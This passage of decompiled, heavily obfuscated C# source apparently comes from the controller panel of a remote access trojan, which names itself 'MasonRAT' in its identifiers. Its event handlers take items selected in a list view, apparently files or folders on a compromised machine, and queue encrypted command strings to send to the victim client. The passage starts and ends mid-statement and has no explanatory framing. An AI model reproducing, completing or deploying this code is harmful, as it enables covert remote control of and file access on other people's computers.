\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = selectedItem.Text;
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u060Fـڙ\u060Aد\u0608بٻــٺـ\u060D\u060Fٸدۡ(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Left = checked (this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Width - this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Width - unchecked (-1567549935 - 2066472374 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 > (-597957374 - ~721707568 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) ? (-1007624356 ^ -1007624379) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 : (781329623 > 659018164 ? 33 : 44) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0)) << unchecked (-0));
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Top = checked (this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Height - this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Height - unchecked (((443031295 | 1557314434) - 1420517456 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + -(1790584532 - 1617610558 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0 ^ 0));
  }

  private void \u2694️MasonRAT\u270Cؤ\u060Eﻼڞ\u060D\u0609ـئ\u0609ڙؤﻻدـة(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 343) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cـْ\u060A\u060Aبٻڕ\u0609\u060D\u060Aـام\u060F(
    object sender,
    EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 344) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Dــﻋـ̍\u060Fدٺـ̍ٺۡـ\u0609\u0608ٻٻد(
    object sender,
    EventArgs e)
  {
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 345) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.Text));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270Cۙ\u060Dـ\u060A\u060Aڅۭڙـؤء\u060A\u060B\u060Dحڙ\u060B\u060B\u0608(
    object sender,
    EventArgs e)
  {
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 346)));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270Cـ\u0608\u060Dْڟـ\u060Dـٽ\u060Fـ\u0608بڙ\u060E\u060A(
    object sender,
    EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 347) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cـم\u060A\u060Aٺد\u060D\u0020ـ\u060D\u060A\u060C(
    object sender,
    EventArgs e)
  {
    try
    {
      if (this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Length < 1261430848 - (1753997236 << 1926550947) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 + ~((370602660 ^ 281417791 % 1947293186) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1))
      {
        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 348);
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 349)));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
      else
      {
        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Substring(0, this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.LastIndexOf(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 350)));
        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Substring(0, checked (this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.LastIndexOf(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 351)) + 1));
        this.\u2694️MasonRAT\u270Cڙب\u060E\u0609ـــۚــ\u060Bټ\u060C\u060F();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Aــ\u060Dــ\u0609ٸٻـ\u060Aٸىۚـڟـۡ\u0608ۡ(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cڙب\u060E\u0609ـــۚــ\u060Bټ\u060C\u060F();
  }

  private void \u2694️MasonRAT\u270Cﻋـ\u060Cــڙڙژ\u060Aـ\u0608ٽـٸ\u060B\u0609ــ(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ = (string) null;
    this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = (string) null;
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        // ISSUE: variable of a reference type
        string& local;
        // ISSUE: explicit reference operation
        string str = ^(local = ref this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ) + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 352) + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text;
        local = str;
        this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 353);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ـ\u0608\u060B\u0608\u060A\u060Dﮪ\u060C\u060Aــ\u060Bؤڙ(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ = (string) null;
    this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = (string) null;
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        // ISSUE: variable of a reference type
        string& local;
        // ISSUE: explicit reference operation
        string str = ^(local = ref this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ) + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 354) + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text;
        local = str;
        this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 355);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060A\u060Dٺ\u0608ۚ\u060A\u0609\u0609\u060E\u060B\u060Aڝ(
    object sender,
    EventArgs e)
  {
    if (Operators.CompareString(this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 356), false) == 0)
    {
      string[] strArray = new string[(1971508816 > 72917244 ? -2147483643 /*0x80000005*/ : 1431655772) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 + ((-1817202672 ^ 657345686 << 1045325708) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 << (764168570 - (942479341 >> 35032197) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 357);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((116992424 >> 1420203011) - 314265066 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + (-690997156 - -990638171 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0] = this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ;
      strArray[((1348248718 ^ ~389294065) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + (-1651749610 - 1445185939 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((763212040 ^ ~219778145) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 ^ -(531183589 - ~12256648 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
      Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
      Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      this.\u2694️MasonRAT\u270Cڇڙۧڝ\u0609\u0609ڠٺءڙـﻋدڜ̍طۙـ̍ڇ = (string) null;
      this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A = (string) null;
    }
    if (Operators.CompareString(this.\u2694️MasonRAT\u270Cﻻـ\u060A\u060Eٻـٸـڙ\u060Aگ\u060Bڙ\u060A, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 358), false) != 0)
      return;
    string[] strArray1 = new string[((-1408410396 - (1480930323 << 1190081294) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) > -315406376 - 2141087289 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 ? (5 ^ 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 : 680736892 - 680736887 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)];
    strArray1[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 359);
    strArray1[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray1[(346337256 - -758942688 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 > (-646776306 ^ ~1511263741) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 ? (1196896590 > 370431595 ? 2 : 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0 : 965544635 % 1877718946 - 965544633 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0) + 